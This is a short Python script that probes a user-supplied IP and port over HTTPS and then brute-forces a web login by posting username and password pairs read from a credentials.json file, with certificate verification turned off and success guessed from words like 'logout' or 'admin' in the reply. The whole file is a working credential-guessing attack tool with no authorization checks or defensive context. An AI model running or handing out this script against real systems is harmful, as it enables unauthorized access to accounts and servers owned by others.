import socket
import ssl
import json

def send_https_probe(ip, port):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((ip, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
                ssock.sendall(request.encode())
                response = ssock.recv(4096).decode(errors='ignore')
                print("[*] Received response from server:\n")
                print(response[:300])
                return response
    except Exception as e:
        print(f"[!] HTTPS packet test failed: {e}")
        return ""

def try_https_login(ip, port):
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    with open("credentials.json", "r") as file:
        credentials = json.load(file)

    url = f"https://{ip}:{port}/"  # Customize path if needed
    print(f"[*] Brute-forcing login at: {url}\n")

    for entry in credentials:
        username = entry["username"]
        password = entry["password"]

        try:
            response = requests.post(
                url,
                data={"username": username, "password": password},
                timeout=5,
                verify=False
            )
            if "logout" in response.text.lower() or "admin" in response.text.lower():
                print(f"[!!!] Vulnerable login found: {username}/{password}")
                return True
        except Exception as e:
            print(f"Error for {username}: {e}")

    print("[-] No valid credentials found.")
    return False

if __name__ == "__main__":
    ip = input("Enter target IP: ").strip()
    port_input = input("Enter target port (default 443): ").strip()
    port = int(port_input) if port_input else 443

    print("\n===[ HTTPS PACKET PROBE ]===")
    response = send_https_probe(ip, port)

    print("\n===[ BRUTE FORCE CHECK ]===")
    try_https_login(ip, port)
